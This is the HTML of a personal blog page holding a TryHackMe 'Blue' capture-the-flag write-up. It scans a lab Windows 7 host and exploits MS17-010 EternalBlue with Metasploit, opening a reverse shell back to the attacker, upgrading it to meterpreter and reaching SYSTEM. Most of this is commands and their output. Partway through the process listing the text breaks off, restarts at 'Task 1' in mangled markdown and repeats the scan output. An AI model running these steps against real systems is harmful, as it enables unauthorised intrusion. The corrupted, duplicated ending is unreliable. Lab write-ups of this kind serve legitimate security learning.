@@ -1,0 +1,2957 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>
+        TryHackMe - Blue Writeup - A personal cybersecurity blog
+      </title>
+        <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport"
+      content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+    <meta name="renderer" content="webkit">
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    
+    <meta name="theme-color" content="#000000" />
+    <meta http-equiv="window-target" content="_top" />
+    
+    
+    <meta name="description" content="An easy windows vulnerable machine" />
+    <meta name="generator" content="Hugo 0.71.0 with theme pure" />
+    <title>TryHackMe - Blue Writeup - A personal cybersecurity blog</title>
+    
+    
+    <link rel="stylesheet" href="/css/style.min.9167e464480f2f7ea5d94b21496c23d7754ad83cf80376bd5fcb8f7988c7a508.css">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css" async>
+    <meta property="og:title" content="TryHackMe - Blue Writeup" />
+<meta property="og:description" content="An easy windows vulnerable machine" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/writeups/tryhackme-writeups/tryhackme-blue-writeup/" />
+<meta property="article:published_time" content="2020-03-26T02:12:46+06:00" />
+<meta property="article:modified_time" content="2020-03-26T02:12:46+06:00" />
+<meta itemprop="name" content="TryHackMe - Blue Writeup">
+<meta itemprop="description" content="An easy windows vulnerable machine">
+<meta itemprop="datePublished" content="2020-03-26T02:12:46&#43;06:00" />
+<meta itemprop="dateModified" content="2020-03-26T02:12:46&#43;06:00" />
+<meta itemprop="wordCount" content="11248">
+
+
+
+<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="TryHackMe - Blue Writeup"/>
+<meta name="twitter:description" content="An easy windows vulnerable machine"/>
+
+    <!--[if lte IE 9]>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+      <![endif]-->
+
+    <!--[if lt IE 9]>
+        <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+      <![endif]-->
+
+  </head>
+
+  
+  
+
+  <body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader">
+    <div class="slimContent">
+      <div class="navbar-header">
+        <div class="profile-block text-center">
+          <a id="avatar" href="/">
+            <img class="img-circle img-rotate" src="/avatar.png" width="200" height="200">
+          </a>
+          <h2 id="name" class="hidden-xs hidden-sm">fmash16</h2>
+          <h3 id="title" class="hidden-xs hidden-sm hidden-md">Student</h3>
+          <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i>Dhaka, Bangladesh</small>
+        </div><div class="search" id="search-form-wrap">
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i
+                        class="icon icon-search"></i></button>
+            </span>
+        </div>
+        <div class="ins-search">
+            <div class="ins-search-mask"></div>
+            <div class="ins-search-container">
+                <div class="ins-input-wrapper">
+                    <input type="text" class="ins-search-input" placeholder="Type something..."
+                        x-webkit-speech />
+                    <button type="button" class="close ins-close ins-selectable" data-dismiss="modal"
+                        aria-label="Close"><span aria-hidden="true">×</span></button>
+                </div>
+                <div class="ins-section-wrapper">
+                    <div class="ins-section-container"></div>
+                </div>
+            </div>
+        </div>
+    </form>
+</div>
+
+        <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+          <span class="sr-only">Toggle navigation</span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+      </div>
+      <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+        <ul class="nav navbar-nav main-nav">
+            <li class="menu-item menu-item-home">
+                <a href="/">
+                    <i class="icon icon-home-fill"></i>
+                  <span class="menu-title">Home</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-archives">
+                <a href="/posts/">
+                    <i class="icon icon-archives-fill"></i>
+                  <span class="menu-title">Posts</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-books">
+                <a href="/categories/">
+                    <i class="icon icon-book-fill"></i>
+                  <span class="menu-title">Writeups</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-tags">
+                <a href="/tags/">
+                    <i class="icon icon-tags"></i>
+                  <span class="menu-title">Tags</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-about">
+                <a href="/about/">
+                    <i class="icon icon-cup-fill"></i>
+                  <span class="menu-title">About</span>
+                </a>
+            </li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+<aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <div class="widget">
+  <h3 class="widget-title"><u> Categories</u></h3>
+    <div class="widget-body">
+        <ul class="category-list">
+            <li class="category-list-item"><a href="/categories/hackthebox-writeups/" class="category-list-link">hackthebox-writeups</a><span class="category-list-count">5</span></li>
+            <li class="category-list-item"><a href="/categories/tryhackme-writeups/" class="category-list-link">tryhackme-writeups</a><span class="category-list-count">3</span></li>
+        </ul>
+    </div>
+</div>
+<div class="widget">
+  <h3 class="widget-title"><u> Tags </u></h3>
+    <div class="widget-body">
+        <ul class="tag-list">
+            
+            
+            <a href="/tags/ad/" class="tag-list-link">ad</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/adminer/" class="tag-list-link">adminer</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/azure/" class="tag-list-link">azure</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/azure-ad-connect/" class="tag-list-link">azure-ad-connect</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/brainfuck/" class="tag-list-link">brainfuck</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/command-injection/" class="tag-list-link">command-injection</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/crackmapexec/" class="tag-list-link">crackmapexec</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/cron/" class="tag-list-link">cron</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/cve-2019-14287/" class="tag-list-link">cve-2019-14287</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/dll-injection/" class="tag-list-link">dll-injection</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/dns/" class="tag-list-link">dns</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/dnsadmins/" class="tag-list-link">dnsadmins</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/docker/" class="tag-list-link">docker</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="/tags/easy/" class="tag-list-link">easy</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/evil-winrm/" class="tag-list-link">evil-winrm</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/file-descriptor/" class="tag-list-link">file-descriptor</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/ftp/" class="tag-list-link">ftp</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/fuzzing/" class="tag-list-link">fuzzing</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="/tags/gtfobins/" class="tag-list-link">gtfobins</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="/tags/hacking/" class="tag-list-link">hacking</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/hydra/" class="tag-list-link">hydra</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="/tags/john/" class="tag-list-link">john</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/kvm/" class="tag-list-link">kvm</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/ldap/" class="tag-list-link">ldap</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="/tags/ldapsearch/" class="tag-list-link">ldapsearch</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/lfi/" class="tag-list-link">lfi</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/linux/" class="tag-list-link">linux</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/mysql/" class="tag-list-link">mysql</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/passthrough/" class="tag-list-link">passthrough</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/php/" class="tag-list-link">php</a><span class="tag-list-count">3</span>
+            
+            
+            <a href="/tags/powershell/" class="tag-list-link">powershell</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/practice/" class="tag-list-link">practice</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/privesc/" class="tag-list-link">privesc</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/pt_chown/" class="tag-list-link">pt_chown</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/pwn/" class="tag-list-link">pwn</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/python/" class="tag-list-link">python</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="/tags/python-path-hijack/" class="tag-list-link">python-path-hijack</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/qemu/" class="tag-list-link">qemu</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/rce/" class="tag-list-link">rce</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="/tags/rpcclient/" class="tag-list-link">rpcclient</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/stego/" class="tag-list-link">stego</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/sudo/" class="tag-list-link">sudo</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="/tags/virtualization/" class="tag-list-link">virtualization</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="/tags/web/" class="tag-list-link">web</a><span class="tag-list-count">1</span>
+            
+        </ul>
+
+    </div>
+</div>
+
+<div class="widget">
+  <h3 class="widget-title"><u> Recent Posts </u></h3>
+    <div class="widget-body">
+        <ul class="recent-post-list list-unstyled no-thumbnail">
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="/writeups/hackthebox-writeups/hackthebox-montevarde-writeup/" class="title">Hackthebox - Montevarde Writeup</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-05-30 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-30</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="/writeups/hackthebox-writeups/hackthebox-resolute-writeup/" class="title">Hackthebox - Resolute Writeup</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-05-29 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-29</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="/writeups/tryhackme-writeups/tryhackme-year-of-the-rabbit-writeup/" class="title">TryHackMe - Year of the Rabbit - Writeup</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-05-21 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-21</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="/writeups/tryhackme-writeups/tryhackme-ultratech-writeup/" class="title">TryHackMe - UltraTech Writeup</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-05-16 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-16</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="/writeups/tryhackme-writeups/tryhackme-dogcat-writeup/" class="title">TryHackMe - DogCat Writeup</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-05-12 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-12</time>
+                    </p>
+                </div>
+            </li>
+        </ul>
+    </div>
+</div>
+
+  </div>
+</aside>
+
+    
+    
+<aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <h4 class="toc-title">Table of Contents</h4>
+    <nav id="toc" class="js-toc toc">
+
+    </nav>
+  </div>
+</aside>
+
+<main class="main" role="main"><div class="content">
+  <article id="-" class="article article-type-" itemscope
+    itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      <h3 itemprop="name">
+  <a
+    class="article-title"
+    href="/writeups/tryhackme-writeups/tryhackme-blue-writeup/"
+    >TryHackMe - Blue Writeup</a
+  >
+</h3>
+
+      <div class="article-meta">
+        
+<span class="article-date">
+  <i class="icon icon-calendar-check"></i>&nbsp;
+<a href="/writeups/tryhackme-writeups/tryhackme-blue-writeup/" class="article-date">
+  <time datetime="2020-03-26 02:12:46 &#43;0600 &#43;06" itemprop="datePublished">2020-03-26</time>
+</a>
+</span>
+
+<br>
+        
+        
+        
+      </div>
+    </div>
+    <div class="article-entry marked-body js-toc-content" itemprop="articleBody">
+      <h2 id="task-1">Task 1:</h2>
+<ol>
+<li>We use the usual nmap to scan the machine. Note that it says that the
+machine does not respond to ICMP requests. So, we have to use <code>-Pn</code>
+with nmap for scanning</li>
+</ol>
+<pre><code>nmap -sC -sV -Pn -oN nmap-out 10.10.221.176
+</code></pre><p>The results:</p>
+<pre><code># Nmap 7.80 scan initiated Wed Mar 25 10:26:26 2020 as: nmap -sC -sV -Pn -oN
+nmap.out 10.10.221.176
+Nmap scan report for 10.10.221.176
+Host is up (0.23s latency).
+Not shown: 991 closed ports
+PORT      STATE SERVICE            VERSION
+135/tcp   open  msrpc              Microsoft Windows RPC
+139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack
+1 microsoft-ds (workgroup: WORKGROUP)
+3389/tcp  open  ssl/ms-wbt-server?
+|_ssl-date: 2020-03-25T14:29:02+00:00; +1s from scanner time.
+49152/tcp open  msrpc              Microsoft Windows RPC
+49153/tcp open  msrpc              Microsoft Windows RPC
+49154/tcp open  msrpc              Microsoft Windows RPC
+49158/tcp open  msrpc              Microsoft Windows RPC
+49159/tcp open  msrpc              Microsoft Windows RPC
+Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 1h15m01s, deviation: 2h30m00s, median: 0s
+|_nbstat: NetBIOS name: JON-PC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC:
+02:d2:17:3d:b2:64 (unknown)
+| smb-os-discovery: 
+|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+|   Computer name: Jon-PC
+|   NetBIOS computer name: JON-PC\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2020-03-25T09:28:55-05:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-03-25T14:28:55
+|_  start_date: 2020-03-25T14:11:35
+
+Service detection performed. Please report any incorrect results at
+https://nmap.org/submit/ .
+# Nmap done at Wed Mar 25 10:30:01 2020 -- 1 IP address (1 host up) scanned in
+215.17 seconds
+</code></pre><ol start="2">
+<li>We find 3 ports with port number under 1000:</li>
+</ol>
+<ul>
+<li>135</li>
+<li>139</li>
+<li>445</li>
+</ul>
+<ol start="3">
+<li>We see that the machine is running Windows &amp; SP 1. We look for exploits for
+this OS on google, and one that mostly comes up is the vulnerability
+ms17-010.</li>
+</ol>
+<h1 id="task-2-gain-access">Task 2: Gain access</h1>
+<ol>
+<li>We start metasploit</li>
+</ol>
+<pre><code>msfconsole
+[-] ***rting the Metasploit Framework console...\
+[-] * WARNING: No database support: No database YAML file                                                                                           
+[-] ***
+                                                  
+
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMM                MMMMMMMMMM
+MMMN$                           vMMMM
+MMMNl  MMMMM             MMMMM  JMMMM
+MMMNl  MMMMMMMN       NMMMMMMM  JMMMM
+MMMNl  MMMMMMMMMNmmmNMMMMMMMMM  JMMMM
+MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
+MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
+MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
+MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
+MMMNI  MMMNM   MMMMMMM   MMMMM  jMMMM
+MMMNI  WMMMM   MMMMMMM   MMMM#  JMMMM
+MMMMR  ?MMNM             MMMMM .dMMMM
+MMMMNm `?MMM             MMMM` dMMMMM
+MMMMMMN  ?MM             MM?  NMMMMMN
+MMMMMMMMNe                 JMMMMMNMMM
+MMMMMMMMMMNm,            eMMMMMNMMNMM
+MMMMNNMNMMMMMNx        MMMMMMNMMNMMNM
+MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM
+        https://metasploit.com
+
+
+       =[ metasploit v5.0.60-dev                          ]
++ -- --=[ 1947 exploits - 1089 auxiliary - 333 post       ]
++ -- --=[ 556 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
+
+</code></pre><ol start="2">
+<li>We search for exploits for the vulnerability ms17-010:</li>
+</ol>
+<pre><code>msf5 &gt; search ms17-010
+
+Matching Modules
+================
+
+   #  Name                                           Disclosure Date  Rank   Check  Description
+   -  ----                                           ---------------  ----   -----  -----------
+   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB RemoteWindows Command Execution
+   1  auxiliary/scanner/smb/smb_ms17_010                              normal  Yes    MS17-010 SMB RCE Detection
+   2  exploit/windows/smb/doublepulsar_rce           2017-04-14       great   Yes    DOUBLEPULSAR Payload Execution and Neutralization
+   3  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   4  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
+   5  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+</code></pre><p>Here, we will use the exploit <code>exploit/windows/smb/ms17_010_eternalblue</code>.</p>
+<pre><code>msf5 &gt; use exploit/windows/smb/ms17_010_eternalblue
+msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; 
+
+</code></pre><h2 id="info">Info:</h2>
+<p>Description:
+This module is a port of the Equation Group ETERNALBLUE exploit,
+part of the FuzzBunch toolkit released by Shadow Brokers. There is a
+buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size is
+calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error
+where a DWORD is subtracted into a WORD. The kernel pool is groomed
+so that overflow is well laid-out to overwrite an SMBv1 buffer.
+Actual RIP hijack is later completed in
+srvnet!SrvNetWskReceiveComplete. This exploit, like the original may
+not trigger 100% of the time, and should be run continuously until
+triggered. It seems like the pool will get hot streaks and need a
+cool down period before the shells rain in again. The module will
+attempt to use Anonymous login, by default, to authenticate to
+perform the exploit. If the user supplies credentials in the
+SMBUser, SMBPass, and SMBDomain options it will use those instead.
+On some systems, this module may cause system instability and
+crashes, such as a BSOD or a reboot. This may be more likely with
+some payloads.</p>
+<p>References:</p>
+<ul>
+<li><a href="https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010">https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010</a></li>
+<li><a href="https://cvedetails.com/cve/CVE-2017-0143/">https://cvedetails.com/cve/CVE-2017-0143/</a></li>
+<li><a href="https://cvedetails.com/cve/CVE-2017-0144/">https://cvedetails.com/cve/CVE-2017-0144/</a></li>
+<li><a href="https://cvedetails.com/cve/CVE-2017-0145/">https://cvedetails.com/cve/CVE-2017-0145/</a></li>
+<li><a href="https://cvedetails.com/cve/CVE-2017-0146/">https://cvedetails.com/cve/CVE-2017-0146/</a></li>
+<li><a href="https://cvedetails.com/cve/CVE-2017-0147/">https://cvedetails.com/cve/CVE-2017-0147/</a></li>
+<li><a href="https://cvedetails.com/cve/CVE-2017-0148/">https://cvedetails.com/cve/CVE-2017-0148/</a></li>
+<li><a href="https://github.com/RiskSense-Ops/MS17-010">https://github.com/RiskSense-Ops/MS17-010</a></li>
+</ul>
+<ol start="3">
+<li>We check the options for this exploit:</li>
+</ol>
+<pre><code>msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; options
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
+
+</code></pre><p>We see that we have to set out RHOSTS whick will be our target machine.So, we
+set RHOST with the ip address of the windows machine from the site:</p>
+<pre><code>msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOSTS 10.10.221.176
+RHOSTS =&gt; 10.10.221.176
+
+</code></pre><ol start="4">
+<li>We run the exploit.</li>
+</ol>
+<pre><code>msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; run
+
+[*] Started reverse TCP handler on 10.8.30.133:4444 
+[+] 10.10.247.170:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[*] 10.10.247.170:445 - Connecting to target for exploitation.
+[+] 10.10.247.170:445 - Connection established for exploitation.
+[+] 10.10.247.170:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 10.10.247.170:445 - CORE raw buffer dump (42 bytes)
+[*] 10.10.247.170:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+[*] 10.10.247.170:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+[*] 10.10.247.170:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31 ice Pack 1      
+[+] 10.10.247.170:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 10.10.247.170:445 - Trying exploit with 12 Groom Allocations.
+[*] 10.10.247.170:445 - Sending all but last fragment of exploit packet
+[*] 10.10.247.170:445 - Starting non-paged pool grooming
+[+] 10.10.247.170:445 - Sending SMBv2 buffers
+[+] 10.10.247.170:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 10.10.247.170:445 - Sending final SMBv2 buffers.
+[*] 10.10.247.170:445 - Sending last fragment of exploit packet!
+[*] 10.10.247.170:445 - Receiving response from exploit packet
+[+] 10.10.247.170:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 10.10.247.170:445 - Sending egg to corrupted connection.
+[*] 10.10.247.170:445 - Triggering free of corrupted buffer.
+[*] Command shell session 1 opened (10.8.30.133:4444 -&gt; 10.10.247.170:49184) at 2020-03-25 15:17:21 -0400
+[+] 10.10.247.170:445
+- =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.247.170:445
+- =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.247.170:445
+- =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32&gt;
+</code></pre><p>Voila! we got a shell!</p>
+<ol start="5">
+<li>We background the shell using Ctrl+z</li>
+</ol>
+<h2 id="task-3-escalate">Task 3: Escalate</h2>
+<ol>
+<li>In order to convert the shell to a meterpreter shell, we use the following
+exploit:</li>
+</ol>
+<pre><code>msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; use
+post/multi/manage/shell_to_meterpreter
+msf5 post(multi/manage/shell_to_meterpreter) &gt; 
+</code></pre><ol start="2">
+<li>We check the options for this exploit:</li>
+</ol>
+<pre><code>msf5 post(multi/manage/shell_to_meterpreter) &gt; options
+
+Module options (post/multi/manage/shell_to_meterpreter):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
+   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
+   LPORT    4433             yes       Port for payload to connect to.
+   SESSION                   yes       The session to run this module on.
+</code></pre><p>So the option that we are required to change is <code>SESSION</code></p>
+<ol start="3">
+<li>In order to ser the option session we need the session id of our previously
+opened shell. To find the session id, we enter the command <code>sessions -l</code></li>
+</ol>
+<pre><code>msf5 post(multi/manage/shell_to_meterpreter) &gt; sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type               Information                           Connection
+  --  ----  ----               -----------                           ----------
+  1         shell x64/windows  Microsoft Windows [Version 6.1.7601]  10.8.30.133:4444 -&gt; 10.10.247.170:49184 (10.10.247.170)
+</code></pre><p>So, the session id is 1. We set the session</p>
+<pre><code>msf5 post(multi/manage/shell_to_meterpreter) &gt; set SESSION 1
+SESSION =&gt; 1
+</code></pre><ol start="4">
+<li>We run the exploit.</li>
+</ol>
+<pre><code>msf5 post(multi/manage/shell_to_meterpreter) &gt; run
+
+[*] Upgrading session ID: 1
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 10.8.30.133:4433 
+[*] Post module execution completed
+msf5 post(multi/manage/shell_to_meterpreter) &gt; 
+[*] Sending stage (180291 bytes) to 10.10.247.170
+[*] Meterpreter session 2 opened (10.8.30.133:4433 -&gt; 10.10.247.170:49193) at
+2020-03-25 15:24:05 -0400
+[*] Stopping exploit/multi/handler
+
+msf5 post(multi/manage/shell_to_meterpreter) &gt; sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                          Connection
+  --  ----  ----                     -----------                          ----------
+  1         shell x64/windows        Microsoft Windows [Version 6.1.7601] 10.8.30.133:4444 -&gt; 10.10.247.170:49184 (10.10.247.170)
+  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ JON-PC         10.8.30.133:4433 -&gt; 10.10.247.170:49193 (10.10.247.170)
+</code></pre><p>We see that we got a meterpreter shell!</p>
+<ol start="5">
+<li>We can interact with th meterpreter shell using the following command:</li>
+</ol>
+<pre><code>msf5 post(multi/manage/shell_to_meterpreter) &gt; sessions -i 2
+[*] Starting interaction with 2...
+
+meterpreter &gt; 
+</code></pre><ol start="6">
+<li>We run getsystem, shell and whoami to check if we have escalated to NT
+AUTHORITY\SYSTEM</li>
+</ol>
+<pre><code>meterpreter &gt; getsystem 
+...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+meterpreter &gt; shell
+Process 2216 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32&gt;whoami
+whoami
+nt authority\system
+
+C:\Windows\system32&gt;
+</code></pre><p>So, we are in fact system!</p>
+<ol start="7">
+<li>We enter the command <code>ps</code> to view the running processes</li>
+</ol>
+<pre><code>C:\Windows\system32&gt;^Z
+Background channel 1? [y/N]  y
+meterpreter &gt; ps
+
+Process List
+============
+
+ PID   PPID  Name                  Arch  Session  User                    Path
+ ---   ----  ----                  ----  -------  ----                    ----
+ 0     0     [System Process]                                                   
+ 4     0     System                x64   0                                      
+ 396   652   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM  ## Task 1:
+
+1. We use the usual nmap to scan the machine. Note that it says that the
+   machine does not respond to ICMP requests. So, we have to use ```-Pn```
+with nmap for scanning
+</code></pre><p>nmap -sC -sV -Pn -oN nmap-out 10.10.221.176</p>
+<pre><code>
+The results:
+</code></pre><h1 id="nmap-780-scan-initiated-wed-mar-25-102626-2020-as-nmap--sc--sv--pn--on">Nmap 7.80 scan initiated Wed Mar 25 10:26:26 2020 as: nmap -sC -sV -Pn -oN</h1>
+<p>nmap.out 10.10.221.176
+Nmap scan report for 10.10.221.176
+Host is up (0.23s latency).
+Not shown: 991 closed ports
+PORT      STATE SERVICE            VERSION
+135/tcp   open  msrpc              Microsoft Windows RPC
+139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack
+1 microsoft-ds (workgroup: WORKGROUP)
+3389/tcp  open  ssl/ms-wbt-server?
+|_ssl-date: 2020-03-25T14:29:02+00:00; +1s from scanner time.
